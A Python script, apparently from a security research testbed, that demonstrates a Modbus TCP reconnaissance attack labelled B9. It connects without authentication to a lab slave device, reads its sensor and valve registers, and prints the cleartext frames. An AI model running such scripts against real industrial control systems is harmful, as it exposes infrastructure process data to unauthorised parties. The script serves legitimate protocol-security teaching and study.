"""
B9 - Passive Reconnaissance
The attacker connects to the slave and reads all holding registers without
any authentication. Modbus TCP has no access control: any host that can
reach port 502 can read the full process state.

The raw MBAP bytes of each exchange are printed to show that all data is
transmitted in cleartext — exactly what a network tap or Wireshark capture
would reveal to a passive observer on the wire.

Note on Docker bridge networking: Docker's bridge driver acts as a virtual
switch (not a hub), so raw-socket sniffing from a third container is not
possible without host-level bridge reconfiguration. This script uses a direct
connection to demonstrate the identical information exposure that a wire-tap
or port-mirror would provide.

Reference: Huitsing et al. (2008), attack B9
Threat type: Interception
Target assets: Field device data, network topology information
"""

import asyncio
import struct
from pymodbus.client import AsyncModbusTcpClient

SLAVE_IP   = "172.20.0.2"
SLAVE_PORT = 502
UNIT_ID    = 1
READ_CYCLES = 5
CYCLE_DELAY = 2.0   # seconds between reads

REGISTER_LABELS = [
    "Temperature  (x0.1 °C)",
    "Pressure     (x0.1 kPa)",
    "Flow rate    (x0.1 L/min)",
    "Valve status (0=closed, 1=open)",
    "Supply voltage (x0.1 V)",
]


def mbap_bytes(tid: int, unit: int, fc: int, pdu: bytes) -> bytes:
    """Build a Modbus TCP MBAP header + PDU (as sent on the wire)."""
    length = 1 + 1 + len(pdu)   # unit_id + fc + pdu
    return struct.pack(">HHHBB", tid, 0, length, unit, fc) + pdu


def show_raw(label: str, raw: bytes) -> None:
    hex_str = " ".join(f"{b:02X}" for b in raw)
    print(f"    {label} bytes: {hex_str}")


async def run() -> None:
    print("[B9] Passive Reconnaissance — connecting to slave (NO authentication required)")
    print(f"[B9] Target: {SLAVE_IP}:{SLAVE_PORT}  unit_id={UNIT_ID}\n")

    client = AsyncModbusTcpClient(SLAVE_IP, port=SLAVE_PORT)
    await client.connect()

    for cycle in range(1, READ_CYCLES + 1):
        rr = await client.read_holding_registers(0, count=5, slave=UNIT_ID)
        if rr.isError():
            print(f"[B9] Cycle {cycle}: read error — {rr}")
            continue

        values = list(rr.registers)

        # Show what appears on the wire (request + response MBAP frames)
        req_pdu  = struct.pack(">HH", 0, 5)          # start_addr=0, count=5
        resp_pdu = struct.pack("B", 10) + b"".join(struct.pack(">H", v) for v in values)
        req_raw  = mbap_bytes(cycle, UNIT_ID, 3, req_pdu)
        resp_raw = mbap_bytes(cycle, UNIT_ID, 3, resp_pdu)

        print(f"[B9] Cycle {cycle}  —  FC03 Read Holding Registers")
        print(f"    REQ  → {SLAVE_IP}:502   unit={UNIT_ID}  start_addr=0  count=5")
        show_raw("REQ ", req_raw)
        print(f"    RSP  ← {SLAVE_IP}:502   unit={UNIT_ID}  register_values={values}")
        show_raw("RSP ", resp_raw)

        print(f"    Decoded sensor state:")
        for i, (label, val) in enumerate(zip(REGISTER_LABELS, values)):
            print(f"      HR[{i}]  {label} = {val}")
        print()

        await asyncio.sleep(CYCLE_DELAY)

    print("[B9] Reconnaissance complete — attacker has full process visibility.")
    print("[B9] All data transmitted in cleartext; no credentials required.")
    client.close()


asyncio.run(run())
